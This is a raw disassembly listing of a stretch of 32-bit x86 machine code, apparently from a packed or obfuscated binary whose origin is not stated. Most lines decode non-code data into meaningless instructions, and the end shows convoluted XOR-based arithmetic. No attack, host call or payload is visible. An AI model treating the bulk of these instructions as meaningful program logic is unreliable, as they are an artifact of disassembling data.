  421762:	in     al,dx
  421763:	add    al,0xc9
  421765:	push   es
  421766:	add    ch,BYTE PTR [ebp+0x269a8c86]
  42176c:	test   DWORD PTR [eax],edx
  42176e:	pop    es
  42176f:	pop    ebp
  421770:	jae    0x4217ae
  421772:	push   ds
  421773:	mov    gs,WORD PTR [edx]
  421775:	hlt    
  421776:	int    0x8e
  421778:	jmp    0xc942:0xd198f16
  42177f:	lds    eax,FWORD PTR [ebx+0x3a]
  421782:	out    dx,eax
  421783:	cmp    DWORD PTR ds:0x680f2612,esi
  421789:	fnstenv [edi]
  42178b:	or     BYTE PTR [edx+0x5b],ah
  42178e:	call   0x55b59a84
  421793:	test   al,0x55
  421795:	cmp    BYTE PTR [esp+edx*2+0x2d],0xb6
  42179a:	daa    
  42179b:	outs   dx,BYTE PTR ds:[esi]
  42179c:	ret    
  42179d:	sbb    BYTE PTR [ecx-0x24],al
  4217a0:	fwait
  4217a1:	enter  0xa3c9,0xbc
  4217a5:	mov    esi,0x1c973f36
  4217aa:	sub    bl,ah
  4217ac:	sbb    al,BYTE PTR [eax+0x24]
  4217af:	ss hlt 
  4217b1:	cmp    eax,0xab83c0cf
  4217b6:	ja     0x42182f
  4217b8:	lahf   
  4217b9:	push   edx
  4217ba:	jl     0x421754
  4217bc:	adc    ch,BYTE PTR [edx]
  4217be:	inc    edi
  4217bf:	lods   eax,DWORD PTR ds:[esi]
  4217c0:	sub    edi,edi
  4217c2:	cdq    
  4217c3:	fs pop esp
  4217c5:	aam    0xb6
  4217c7:	mov    ah,dl
  4217c9:	lods   eax,DWORD PTR ds:[esi]
  4217ca:	adc    al,0x47
  4217cc:	pop    es
  4217cd:	js     0x42181a
  4217cf:	mov    WORD PTR [edx+0x14],fs
  4217d2:	push   eax
  4217d3:	das    
  4217d4:	ins    DWORD PTR es:[edi],dx
  4217d5:	dec    ecx
  4217d6:	bound  ecx,QWORD PTR [edx]
  4217d8:	mov    BYTE PTR gs:[ecx-0xd70c5bc],bh
  4217df:	lods   al,BYTE PTR ds:[esi]
  4217e0:	mov    cl,0x2a
  4217e2:	dec    eax
  4217e3:	bound  ebx,QWORD PTR [ebp+0x7]
  4217e6:	rol    DWORD PTR [esi-0x23],0x67
  4217ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217eb:	je     0x421815
  4217ed:	dec    esi
  4217ee:	rcr    DWORD PTR [esi],cl
  4217f0:	cmp    edi,DWORD PTR [eax-0x6a09514a]
  4217f6:	xchg   BYTE PTR [edi],ah
  4217f8:	iret   
  4217f9:	dec    ebp
  4217fa:	fbstp  TBYTE PTR [ecx+0x34]
  4217fd:	icebp  
  4217fe:	adc    edx,ebp
  421800:	fisubr DWORD PTR [ebx]
  421802:	sub    ecx,DWORD PTR [eax]
  421804:	call   0xc780:0x25a2b4a0
  42180b:	bound  esi,QWORD PTR [eax-0x3d]
  42180e:	sub    al,0x9
  421810:	push   ds
  421811:	leave  
  421812:	iret   
  421813:	jecxz  0x4217ca
  421815:	and    edi,DWORD PTR [eax+0x6a]
  421818:	dec    esp
  421819:	xchg   DWORD PTR [edx],esi
  42181b:	pusha  
  42181c:	gs (bad) 
  42181e:	pushf  
  42181f:	fs jecxz 0x421899
  421822:	test   al,0x25
  421825:	test   BYTE PTR [edi-0x2bf65eca],cl
  42182b:	lods   eax,DWORD PTR ds:[esi]
  42182c:	mov    eax,ds:0x23ed0cdb
  421831:	(bad)  
  421832:	mov    ebx,0x47f022ee
  421837:	mov    esi,0x4563c0cf
  42183c:	mov    ah,ah
  42183e:	jmp    0x4217d2
  421840:	mov    ds,WORD PTR cs:[edx]
  421843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421844:	sub    ebx,DWORD PTR [ebp-0x18]
  421847:	jecxz  0x4217fa
  421849:	add    DWORD PTR [ebx],esp
  42184b:	test   DWORD PTR [eax],eax
  42184d:	inc    edx
  42184e:	and    al,0x92
  421850:	push   ebx
  421851:	mov    al,ds:0xcd9f7081
  421856:	mov    eax,ds:0xe3bec558
  42185b:	ror    DWORD PTR [eax],cl
  42185d:	jbe    0x4218b3
  42185f:	cmp    al,0x94
  421861:	inc    ebx
  421862:	and    edi,DWORD PTR [ecx+0xc]
  421865:	outs   dx,DWORD PTR ds:[esi]
  421866:	pop    ebp
  421867:	popf   
  421868:	add    BYTE PTR [edi-0x78],bh
  42186b:	or     BYTE PTR [eax+eiz*2-0x7b],dh
  42186f:	xor    al,BYTE PTR [edi-0x1e9bee13]
  421875:	sbb    esi,esi
  421877:	out    dx,eax
  421878:	sub    BYTE PTR [ecx+ecx*8],dh
  42187b:	sub    eax,0xa8f30564
  421880:	mov    al,ds:0xbc0b076a
  421885:	jne    0x4218ae
  421887:	fidivr DWORD PTR [ebx-0x20491a4]
  42188d:	clc    
  42188e:	outs   dx,DWORD PTR ds:[esi]
  42188f:	or     bh,cl
  421891:	mov    edi,0x23e3c76f
  421896:	pop    esp
  421897:	gs loopne 0x421883
  42189a:	(bad)  
  42189b:	leave  
  42189c:	push   0xffffffc2
  42189e:	xchg   ebp,eax
  42189f:	mov    ch,0xe2
  4218a1:	cli    
  4218a2:	mov    WORD PTR [eax],fs
  4218a4:	adc    DWORD PTR [ebx-0x9],ebx
  4218a7:	aaa    
  4218a8:	loopne 0x421873
  4218aa:	adc    BYTE PTR [ecx+0x42],bh
  4218ad:	sub    ch,BYTE PTR ds:0x457db9a8
  4218b4:	mov    cl,0x1f
  4218b6:	lds    esp,FWORD PTR [edx-0x29]
  4218b9:	jo     0x42188e
  4218bb:	dec    ecx
  4218bc:	sub    BYTE PTR [eax+0x4e],bh
  4218bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218c0:	hlt    
  4218c1:	out    0xad,eax
  4218c3:	push   0x33f8fa41
  4218c8:	dec    edi
  4218c9:	aas    
  4218ca:	pop    ebx
  4218cb:	loopne 0x4218cd
  4218cd:	sub    dl,bh
  4218cf:	popa   
  4218d0:	int3   
  4218d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218d2:	xchg   ecx,eax
  4218d3:	xchg   al,bh
  4218d5:	inc    eax
  4218d6:	mov    al,0xd8
  4218d8:	in     al,0xde
  4218da:	sub    DWORD PTR ds:0xcaf9c2ef,esp
  4218e0:	or     DWORD PTR [ecx+ecx*1+0x42e5ca05],esi
  4218e7:	xor    DWORD PTR [ecx+0x77],ebp
  4218ea:	aam    0xa5
  4218ec:	je     0x42190e
  4218ee:	clc    
  4218ef:	es call 0x43aae26b
  4218f5:	nop
  4218f6:	sbb    BYTE PTR [ebx+0x8],dh
  4218f9:	test   al,0x76
  4218fb:	stc    
  4218fc:	mov    edx,0xd5894545
  421901:	das    
  421902:	fsubr  st,st(7)
  421904:	jmp    0xf15f:0x9162e163
  42190b:	adc    bl,BYTE PTR [ecx-0x58]
  42190e:	mov    edx,0xbf81ad85
  421913:	stc    
  421914:	test   edx,ebx
  421916:	mov    eax,0xee6c19b5
  42191b:	push   edx
  42191c:	or     al,0xa8
  42191e:	and    DWORD PTR [edx+0x1d2207fc],ecx
  421924:	(bad)  
  421925:	in     eax,dx
  421926:	sbb    BYTE PTR [edi],0xf
  421929:	es aaa 
  42192b:	std    
  42192c:	aad    0xa4
  42192e:	mov    edi,DWORD PTR [edi+0x25]
  421931:	das    
  421932:	adc    eax,edi
  421934:	cmp    eax,DWORD PTR [eax-0x3d]
  421937:	push   ebx
  421938:	clc    
  421939:	mov    al,ds:0x9d0712e5
  42193e:	push   esi
  42193f:	arpl   WORD PTR [esi+eax*1+0x59],bp
  421943:	sbb    ecx,DWORD PTR [esi]
  421945:	or     BYTE PTR [edx],dh
  421947:	clc    
  421948:	or     BYTE PTR [ebp+eiz*1-0x6ace5387],dh
  42194f:	imul   BYTE PTR [si]
  421952:	and    ebx,DWORD PTR [ecx]
  421954:	xor    BYTE PTR [edx-0x6b],cl
  421957:	(bad)  
  421958:	out    dx,al
  421959:	mov    WORD PTR [ebp-0x51],gs
  42195c:	arpl   WORD PTR [edx-0x5262cb81],dx
  421962:	nop
  421963:	push   edi
  421964:	aam    0xc2
  421966:	push   edx
  421967:	fst    DWORD PTR [edx+0x78aeb18f]
  42196d:	sbb    BYTE PTR [edi],cl
  42196f:	pop    ecx
  421970:	loopne 0x42190a
  421972:	scas   eax,DWORD PTR es:[edi]
  421973:	inc    esi
  421974:	xchg   ecx,eax
  421975:	popf   
  421976:	and    BYTE PTR [eax-0x20981df2],al
  42197c:	mov    edi,0xb8f15a34
  421981:	push   ss
  421982:	xor    BYTE PTR ds:0x3d225b54,0x2c
  421989:	xor    BYTE PTR [edx-0x59],al
  42198c:	mov    ch,0xfc
  42198e:	jo     0x4219c9
  421990:	enter  0x182c,0x78
  421994:	out    0x62,al
  421996:	mov    ds:0xf3448f4e,al
  42199b:	sub    eax,DWORD PTR [esi+edx*4]
  42199e:	retf   
  42199f:	adc    edi,DWORD PTR fs:[edx]
  4219a2:	add    dl,BYTE PTR [eax+0x1730f230]
  4219a8:	inc    esi
  4219a9:	(bad)  
  4219aa:	mov    esi,0x9f6b8a5a
  4219af:	mov    ebx,0xb93ce0e5
  4219b4:	jno    0x421938
  4219b6:	push   esi
  4219b7:	jle    0x421a0f
  4219b9:	(bad)  
  4219ba:	push   ebp
  4219bb:	push   ecx
  4219bc:	(bad)  
  4219bd:	aad    0xed
  4219bf:	lods   al,BYTE PTR ds:[esi]
  4219c0:	mov    ch,0x16
  4219c2:	pop    ds
  4219c3:	(bad)  
  4219c4:	jp     0x4219cb
  4219c6:	retf   
  4219c7:	xlat   BYTE PTR ds:[ebx]
  4219c8:	mov    esi,0xb5f3ea6e
  4219cd:	popf   
  4219ce:	cli    
  4219cf:	push   ecx
  4219d0:	popf   
  4219d1:	xchg   BYTE PTR [esi],ah
  4219d3:	cmp    DWORD PTR ds:[edx+ebp*1-0x6],ecx
  4219d8:	inc    ebx
  4219d9:	pop    esp
  4219da:	xchg   ecx,eax
  4219db:	and    BYTE PTR ds:0x2e07175a,al
  4219e1:	in     al,0x2e
  4219e3:	call   0xed65:0xdaa47210
  4219ea:	push   eax
  4219eb:	ret    0xc38c
  4219ee:	push   ebx
  4219ef:	fwait
  4219f0:	add    BYTE PTR [eax-0x1f],al
  4219f3:	fiadd  WORD PTR [edx]
  4219f5:	or     eax,0x782ad1eb
  4219fa:	adc    eax,0x5b9f041a
  4219ff:	xor    ah,BYTE PTR [edx+0xbdfcc48]
  421a05:	mov    BYTE PTR [ecx*1+0x5f0474dc],dl
  421a0c:	mov    edx,0xc9ca5541
  421a11:	out    dx,eax
  421a12:	retf   
  421a13:	out    dx,al
  421a14:	inc    eax
  421a15:	jno    0x421a42
  421a17:	adc    eax,0x7a5c1fbc
  421a1c:	mov    ebp,0x144cb22f
  421a21:	mov    esp,0x5d8c1efd
  421a26:	in     al,dx
  421a27:	jae    0x421a8b
  421a29:	aad    0x1d
  421a2b:	add    al,0x94
  421a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a2e:	jge    0x4219fc
  421a30:	or     ecx,ebp
  421a32:	outs   dx,BYTE PTR ds:[esi]
  421a33:	xchg   edx,eax
  421a34:	test   BYTE PTR [edx-0x11],0x35
  421a38:	xchg   edi,eax
  421a39:	cli    
  421a3a:	xchg   ebp,eax
  421a3b:	inc    ecx
  421a3c:	nop
  421a3d:	sub    al,0x29
  421a3f:	jae    0x421a8c
  421a41:	in     eax,0x3f
  421a43:	mov    bl,0x55
  421a45:	cmc    
  421a46:	out    0x8e,eax
  421a48:	lea    esi,[edx+0x11]
  421a4b:	into   
  421a4c:	loopne 0x421a6f
  421a4e:	outs   dx,BYTE PTR ds:[esi]
  421a4f:	push   ss
  421a50:	sbb    BYTE PTR ds:0xf0d3901e,bl
  421a56:	std    
  421a57:	into   
  421a58:	mov    esp,0xe9a7f59d
  421a5d:	mov    ds:0x6c6f6f0d,al
  421a62:	jl     0x421a49
  421a64:	repnz cmp ch,BYTE PTR [esi+0x4c]
  421a68:	or     esi,DWORD PTR [ebp+0x71]
  421a6b:	rcl    BYTE PTR [ecx],0x33
  421a6e:	xor    ch,cl
  421a70:	rcr    DWORD PTR [ebx+0x5a],1
  421a73:	fdivr  DWORD PTR [ebx]
  421a75:	mov    WORD PTR [eax+0x47f45910],?
  421a7b:	mov    ds,ebx
  421a7d:	lea    ebx,[ecx]
  421a7f:	aad    0x6e
  421a81:	jne    0x421a94
  421a83:	lahf   
  421a84:	ja     0x421af0
  421a86:	sti    
  421a87:	mov    edi,0x6798f076
  421a8c:	jmp    0xf7168b7
  421a91:	mov    cl,0x8b
  421a93:	mov    esp,cs
  421a95:	push   ebp
  421a96:	outs   dx,DWORD PTR ds:[esi]
  421a97:	xor    ebx,DWORD PTR [edi-0xcd11600]
  421a9d:	dec    edi
  421a9e:	aaa    
  421a9f:	ss pop ecx
  421aa1:	mov    edx,0x39ece4d7
  421aa6:	out    0x14,eax
  421aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aa9:	inc    eax
  421aaa:	dec    esi
  421aab:	mov    ecx,0x33168bd8
  421ab0:	inc    ebx
  421ab1:	push   esi
  421ab2:	scas   eax,DWORD PTR es:[edi]
  421ab3:	cwde   
  421ab4:	scas   al,BYTE PTR es:[edi]
  421ab5:	jmp    0x421a55
  421ab7:	dec    ebp
  421ab8:	test   esp,esi
  421aba:	fdivr  QWORD PTR [ebp-0x164a1fce]
  421ac0:	call   0x5eda:0xb724b6a2
  421ac7:	xchg   edi,eax
  421ac8:	daa    
  421ac9:	push   esi
  421aca:	inc    eax
  421acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421acc:	in     al,dx
  421acd:	ret    0x463f
  421ad0:	jmp    0x421ad1
  421ad2:	xor    al,0xb9
  421ad4:	xlat   BYTE PTR ds:[ebx]
  421ad5:	scas   al,BYTE PTR es:[edi]
  421ad6:	aas    
  421ad7:	jecxz  0x421a84
  421ad9:	aaa    
  421ada:	mov    eax,ds:0x194326cb
  421adf:	mov    eax,DWORD PTR [edi]
  421ae1:	test   BYTE PTR [ecx+0x4],0x39
  421ae5:	add    dl,bh
  421ae7:	push   edx
  421ae8:	mov    bh,0xc9
  421aea:	adc    BYTE PTR [edx],dh
  421aec:	ret    0x2041
  421aef:	and    DWORD PTR [eax],ebx
  421af1:	(bad)  
  421af2:	xor    dl,BYTE PTR [esi+0x70]
  421af5:	nop
  421af6:	or     eax,0x4242597c
  421afb:	add    esp,DWORD PTR [ecx-0x10]
  421afe:	into   
  421aff:	cmp    dl,BYTE PTR [esp+eax*4+0x6725c8da]
  421b06:	pop    ds
  421b07:	retf   
  421b08:	cmp    BYTE PTR [edi+0x44dadba4],0x2a
  421b0f:	mul    BYTE PTR [eax+ebp*8]
  421b12:	clc    
  421b13:	mov    ecx,edx
  421b15:	lods   al,BYTE PTR ds:[esi]
  421b16:	xchg   ebx,eax
  421b17:	shl    ch,1
  421b19:	lods   eax,DWORD PTR ds:[esi]
  421b1a:	pop    eax
  421b1b:	cmp    ecx,DWORD PTR fs:0x6a065476
  421b22:	dec    eax
  421b23:	mov    dh,dl
  421b25:	fnstsw WORD PTR [ecx+edi*8+0x4b15ab19]
  421b2c:	cli    
  421b2d:	lahf   
  421b2e:	jmp    0xf1f5adaf
  421b33:	inc    esp
  421b34:	jecxz  0x421ba7
  421b36:	dec    ebp
  421b37:	fadd   QWORD PTR [eax-0x7b]
  421b3a:	sub    dh,ch
  421b3c:	and    BYTE PTR [ecx-0x617b80bd],ah
  421b42:	cdq    
  421b43:	js     0x421b84
  421b45:	ins    DWORD PTR es:[edi],dx
  421b46:	enter  0x17b8,0x30
  421b4a:	icebp  
  421b4b:	push   ss
  421b4c:	mov    dh,0x96
  421b4e:	rol    esi,0x20
  421b51:	xor    BYTE PTR [ebx+0x6c],dh
  421b54:	xchg   ecx,eax
  421b55:	inc    eax
  421b56:	ins    DWORD PTR es:[edi],dx
  421b57:	jge    0x421bad
  421b59:	les    edx,FWORD PTR [ebp-0x6c986f24]
  421b5f:	adc    esi,edi
  421b61:	call   0xa2c9:0xe47a64db
  421b68:	push   ecx
  421b69:	mov    ds:0x8130fafc,eax
  421b6e:	sbb    DWORD PTR [eax+0xb],0x7adcde9b
  421b75:	add    al,0x43
  421b77:	jl     0x421b41
  421b79:	sbb    al,0x72
  421b7b:	xlat   BYTE PTR ds:[ebx]
  421b7c:	push   ebp
  421b7d:	stos   DWORD PTR es:[edi],eax
  421b7e:	or     eax,0x89b066fc
  421b83:	sub    eax,0x689f5116
  421b88:	dec    ebx
  421b89:	jbe    0x421bfb
  421b8b:	sbb    BYTE PTR [esi+edi*2-0x1],ah
  421b8f:	div    DWORD PTR [ebx]
  421b91:	pop    ebp
  421b92:	or     ebp,DWORD PTR [edi-0x265603f9]
  421b98:	xchg   esp,eax
  421b99:	aam    0xee
  421b9b:	lods   al,BYTE PTR ds:[esi]
  421b9c:	stc    
  421b9d:	outs   dx,BYTE PTR ds:[esi]
  421b9e:	je     0x421b3f
  421ba0:	dec    ebx
  421ba1:	mov    esp,0x81b280c6
  421ba6:	sub    DWORD PTR [eax+0x1d],ecx
  421ba9:	cwde   
  421baa:	mov    WORD PTR [esi+0x51],fs
  421bad:	fdivr  DWORD PTR [eax]
  421baf:	mov    cl,0x7
  421bb1:	sbb    ch,bh
  421bb3:	xor    eax,0x27cb57d9
  421bb8:	mov    ebx,DWORD PTR [esi+ecx*1+0x75]
  421bbc:	sti    
  421bbd:	adc    eax,0xa693911f
  421bc2:	leave  
  421bc3:	div    BYTE PTR [edx]
  421bc5:	mov    dl,0x80
  421bc7:	adc    esp,DWORD PTR [ebx]
  421bc9:	cld    
  421bca:	retf   0x221f
  421bcd:	repz xor esp,ebx
  421bd0:	cmp    ecx,DWORD PTR [ebp-0x2c]
  421bd3:	sbb    ch,ah
  421bd5:	xchg   esp,eax
  421bd6:	dec    edi
  421bd7:	clc    
  421bd8:	loopne 0x421c41
  421bda:	ficomp DWORD PTR [eax+0x759d6479]
  421be0:	mov    DWORD PTR [eax-0x1a65e8cd],eax
  421be6:	push   ds
  421be7:	shl    DWORD PTR [ebx],0x21
  421bea:	adc    al,0xa7
  421bec:	dec    ebp
  421bed:	mov    ebp,0x94ef4afd
  421bf2:	(bad)  
  421bf3:	aaa    
  421bf4:	jp     0x421c55
  421bf6:	fdivp  st(0),st
  421bf8:	call   0xd224:0x7e0d7120
  421bff:	pop    esp
  421c00:	int3   
  421c01:	shl    BYTE PTR [ebx],cl
  421c03:	xchg   esi,eax
  421c04:	add    BYTE PTR [eax+0x7b],bl
  421c07:	push   ds
  421c08:	test   DWORD PTR [ebp-0x13928a0f],ebx
  421c0e:	xchg   esi,eax
  421c0f:	shl    BYTE PTR [edi],0xfe
  421c12:	je     0x421c08
  421c14:	in     eax,dx
  421c15:	stc    
  421c16:	pop    ecx
  421c17:	dec    edi
  421c18:	mov    ecx,0x6a831510
  421c1d:	popa   
  421c1e:	dec    esp
  421c1f:	jno    0x421c6b
  421c21:	in     al,0x34
  421c23:	jl     0x421c16
  421c25:	stos   BYTE PTR es:[edi],al
  421c26:	sub    ch,BYTE PTR [edx-0x129e4c99]
  421c2c:	(bad)  
  421c2d:	jb     0x421c4d
  421c2f:	inc    ebx
  421c30:	popf   
  421c31:	cs push edi
  421c33:	bound  esp,QWORD PTR [edi]
  421c35:	push   edx
  421c36:	inc    esi
  421c37:	dec    ebx
  421c38:	push   ds
  421c39:	and    eax,0xb3c489ff
  421c3e:	and    eax,0xe9b187d2
  421c43:	or     BYTE PTR [ebx+ebx*4-0x36],ch
  421c47:	or     DWORD PTR [ecx+0x36],edx
  421c4a:	js     0x421c54
  421c4c:	loop   0x421c32
  421c4e:	stos   BYTE PTR es:[edi],al
  421c4f:	sub    BYTE PTR [edx-0x78],ah
  421c52:	outs   dx,DWORD PTR ds:[esi]
  421c53:	mov    eax,0x7e99e12f
  421c58:	mov    eax,0x2a8d6a3b
  421c5d:	sbb    DWORD PTR [ecx+0x20],esi
  421c60:	xor    edx,esi
  421c62:	sbb    DWORD PTR [esi+0x70],ebx
  421c65:	fs dec ecx
  421c67:	mov    ch,0x95
  421c69:	jg     0x421cab
  421c6b:	dec    edi
  421c6c:	xchg   BYTE PTR es:[esi],ch
  421c6f:	sbb    ch,dl
  421c71:	push   esp
  421c72:	retf   0xce85
  421c75:	pop    eax
  421c76:	int    0x5d
  421c78:	int3   
  421c79:	inc    esp
  421c7b:	mov    ch,0x38
  421c7d:	loop   0x421ce6
  421c7f:	pop    edx
  421c80:	dec    ebp
  421c81:	stc    
  421c82:	jnp    0x421cdc
  421c84:	inc    esp
  421c85:	mov    ebp,0x76ae228f
  421c8a:	push   0x317f2e2
  421c8f:	daa    
  421c90:	scas   eax,DWORD PTR es:[edi]
  421c91:	outs   dx,BYTE PTR ds:[esi]
  421c92:	sbb    al,0x5
  421c94:	in     eax,dx
  421c95:	mov    ah,0x8d
  421c97:	fucomi st,st(7)
  421c99:	cwde   
  421c9a:	aad    0xa7
  421c9c:	jno    0x421c7e
  421c9e:	push   esi
  421c9f:	and    DWORD PTR [edx+0x3],edi
  421ca2:	and    DWORD PTR [edx+0x5343ceaa],ecx
  421ca8:	pop    edx
  421ca9:	mov    cl,0x25
  421cab:	cld    
  421cac:	mov    dl,0xdb
  421cae:	jns    0x421c86
  421cb0:	jg     0x421c96
  421cb2:	fistp  DWORD PTR [esi-0x54]
  421cb5:	mov    esi,0x371c64f3
  421cba:	int3   
  421cbb:	xor    al,0x28
  421cbd:	sbb    edx,edx
  421cbf:	jecxz  0x421cef
  421cc1:	mov    ecx,0xd9c17ddd
  421cc6:	lods   al,BYTE PTR ds:[esi]
  421cc7:	fdivr  QWORD PTR [ebp+0x52]
  421cca:	adc    DWORD PTR [eax-0x43],0x28
  421cce:	es dec ebp
  421cd0:	xlat   BYTE PTR ds:[ebx]
  421cd1:	cmp    eax,0x8ec3f4fb
  421cd6:	bound  eax,QWORD PTR [ebx]
  421cd8:	or     eax,DWORD PTR [ecx+0x1e4bdd55]
  421cde:	test   eax,0x94cc60a7
  421ce3:	jmp    0x70f9c77f
  421ce8:	dec    ebp
  421ce9:	outs   dx,BYTE PTR ds:[esi]
  421cea:	iret   
  421ceb:	stos   DWORD PTR es:[edi],eax
  421cec:	not    edx
  421cee:	dec    edx
  421cef:	mov    edi,ebx
  421cf1:	pop    ecx
  421cf2:	fst    DWORD PTR [edi+0xde39765]
  421cf8:	sbb    DWORD PTR [edx],esp
  421cfa:	shr    ecx,cl
  421cfc:	cmp    esi,DWORD PTR [eax+0x2f]
  421cff:	pop    esp
  421d00:	dec    esi
  421d01:	popa   
  421d02:	mov    BYTE PTR [ebp-0x7bd050eb],bh
  421d08:	pop    ss
  421d09:	hlt    
  421d0a:	out    dx,eax
  421d0b:	(bad)  
  421d0c:	cld    
  421d0d:	retf   0x6b29
  421d10:	ja     0x421d58
  421d12:	fild   DWORD PTR [ecx+0x15]
  421d15:	jnp    0x421d5f
  421d17:	dec    edx
  421d18:	mov    dl,0xc7
  421d1a:	sub    BYTE PTR [ebp+0x55220fee],0x6b
  421d21:	mov    DWORD PTR [edx],ebx
  421d23:	mov    al,ds:0x40bf7d30
  421d28:	shr    bl,1
  421d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d2b:	xor    DWORD PTR [ebx+0x663ee005],esp
  421d31:	daa    
  421d32:	jno    0x421d74
  421d34:	loop   0x421ced
  421d36:	xchg   ecx,eax
  421d37:	adc    dh,BYTE PTR [edi]
  421d39:	loope  0x421cf6
  421d3b:	aaa    
  421d3c:	mov    ds:0x7acc0dbc,eax
  421d41:	push   0xffffffd1
  421d43:	stc    
  421d44:	mov    ecx,0x34797761
  421d49:	xor    DWORD PTR [ebx],esi
  421d4b:	bound  ecx,QWORD PTR [esi]
  421d4d:	cs jp  0x421ce0
  421d50:	pop    es
  421d51:	push   edi
  421d52:	fsub   QWORD PTR [ebx+eiz*1]
  421d55:	stos   DWORD PTR es:[edi],eax
  421d56:	out    0x3d,al
  421d58:	mov    edx,0x5832791f
  421d5d:	stc    
  421d5e:	or     BYTE PTR [ebx+eiz*4-0x3],cl
  421d62:	jmp    0x733d:0xff668d25
  421d69:	pop    ecx
  421d6a:	loopne 0x421d01
  421d6c:	dec    ebx
  421d6d:	add    dh,cl
  421d6f:	out    0xb7,al
  421d71:	into   
  421d72:	inc    eax
  421d73:	retf   0x8a8e
  421d76:	cli    
  421d77:	leave  
  421d78:	nop
  421d79:	sbb    edx,DWORD PTR [ebp+0x5bcbf101]
  421d7f:	call   0xe9d4da70
  421d84:	mov    edi,0xb01213e1
  421d89:	sbb    DWORD PTR [eax-0x5c8f2df2],edi
  421d8f:	jl     0x421da2
  421d91:	xlat   BYTE PTR ds:[ebx]
  421d92:	add    DWORD PTR [eax],ebp
  421d94:	ficomp WORD PTR ds:[esp+esi*1-0x42]
  421d99:	mov    DWORD PTR [ebx],0xe36e3b19
  421d9f:	or     DWORD PTR ds:0xb5c72b84,ebp
  421da5:	sbb    eax,0x66c66577
  421daa:	sbb    eax,0x2621c09c
  421daf:	test   eax,0x8476ab0b
  421db4:	scas   al,BYTE PTR es:[edi]
  421db5:	cmp    al,BYTE PTR [esi+0x792ff4eb]
  421dbb:	dec    edx
  421dbc:	ror    DWORD PTR [edi+ebp*2+0x6fa3f28f],1
  421dc3:	(bad)  
  421dc4:	sbb    al,0x72
  421dc6:	pop    esi
  421dc7:	add    DWORD PTR [esi-0x52],edi
  421dca:	in     eax,dx
  421dcb:	dec    eax
  421dcc:	mov    edi,0x1ef8bf4
  421dd1:	mov    ds:0xa7dc2e73,al
  421dd6:	daa    
  421dd7:	or     DWORD PTR [esi+0x57],edx
  421dda:	(bad)  
  421ddb:	dec    esi
  421ddc:	addr16 ja 0x421e4c
  421ddf:	push   edx
  421de0:	xor    BYTE PTR [edx],bh
  421de2:	and    esp,DWORD PTR [edx]
  421de4:	pop    edx
  421de5:	adc    al,0x13
  421de7:	xlat   BYTE PTR ds:[ebx]
  421de8:	test   ebp,edi
  421dea:	mov    bh,BYTE PTR [ecx]
  421dec:	in     al,0x34
  421dee:	outs   dx,DWORD PTR ds:[esi]
  421def:	iret   
  421df0:	gs xchg edx,eax
  421df2:	sbb    eax,0x4c23572f
  421df7:	enter  0x7b1a,0x7f
  421dfb:	and    eax,0x316397d1
  421e00:	xor    DWORD PTR [eax-0x6e],esp
  421e03:	jecxz  0x421e77
  421e05:	fmul   DWORD PTR [edx-0x2e1fb729]
  421e0b:	in     eax,0x22
  421e0d:	fisttp QWORD PTR [esi+0x5e54b58e]
  421e13:	loop   0x421e1a
  421e15:	pop    ebp
  421e16:	js     0x421db1
  421e18:	pop    ecx
  421e19:	xor    BYTE PTR ds:0x9b2ecf18,0x66
  421e20:	cld    
  421e21:	mov    al,ds:0x2ca6367f
  421e26:	pop    esi
  421e27:	ss fwait
  421e29:	lods   al,BYTE PTR ds:[esi]
  421e2a:	sub    eax,0x299e496c
  421e2f:	xchg   DWORD PTR [ecx-0x77c65a4b],eax
  421e35:	fsub   QWORD PTR [ecx+0x4b0a3337]
  421e3b:	out    0x9b,al
  421e3d:	inc    ebp
  421e3e:	les    esp,FWORD PTR ds:0x22b1eb88
  421e44:	push   0x55dc1be9
  421e49:	mov    ebp,DWORD PTR [ebp-0xbaa7635]
  421e4f:	mov    edx,DWORD PTR [ebp-0x10]
  421e52:	xor    edx,eax
  421e54:	add    edx,esi
  421e56:	jne    0x41d43b
  421e5c:	jmp    0x42314f
  421e61:	mov    ecx,DWORD PTR [ebp-0x14]
  421e64:	mov    DWORD PTR [ebp+0x8],ecx
  421e67:	jmp    0x421ee0
  421e6c:	mov    ecx,DWORD PTR [ebp+0x8]
  421e6f:	mov    edx,DWORD PTR [ebp-0x8]
  421e72:	xor    ecx,eax
  421e74:	xor    edx,eax
  421e76:	sub    ecx,edx
  421e78:	sub    ecx,esi
  421e7a:	xor    ecx,eax
  421e7c:	mov    DWORD PTR [ebp+0x8],ecx
  421e7f:	mov    ecx,DWORD PTR [ebp+0x8]
  421e82:	mov    edx,DWORD PTR [ebp-0x58]
  421e85:	add    ecx,0x5708fa
  421e8b:	imul   ecx,edx
  421e8e:	mov    DWORD PTR [ebp-0x58],ecx
  421e91:	mov    ecx,DWORD PTR [ebp+0x8]
  421e94:	mov    edx,DWORD PTR [ebp-0x54]
  421e97:	add    ecx,0x64f898
  421e9d:	or     ecx,edx
  421e9f:	mov    DWORD PTR [ebp-0x54],ecx
  421ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ea5:	mov    edx,DWORD PTR [ebp-0x50]
  421ea8:	add    ecx,0x242ebc9
  421eae:	xor    ecx,edx
  421eb0:	mov    DWORD PTR [ebp-0x50],ecx
  421eb3:	mov    ecx,DWORD PTR [ebp+0x8]
  421eb6:	mov    edx,DWORD PTR [ebp-0x4c]
  421eb9:	add    ecx,edi
  421ebb:	and    ecx,edx
  421ebd:	mov    DWORD PTR [ebp-0x4c],ecx
  421ec0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ec3:	mov    edx,DWORD PTR [ebp-0x48]
  421ec6:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421ecd:	mov    DWORD PTR [ebp-0x48],ecx
  421ed0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ed3:	mov    edx,0xfa5e1524
  421ed8:	sub    edx,ecx
  421eda:	add    edx,DWORD PTR [ebp-0x44]
  421edd:	mov    DWORD PTR [ebp-0x44],edx
  421ee0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ee3:	xor    ecx,eax
  421ee5:	add    ecx,esi
  421ee7:	jne    0x421e6c
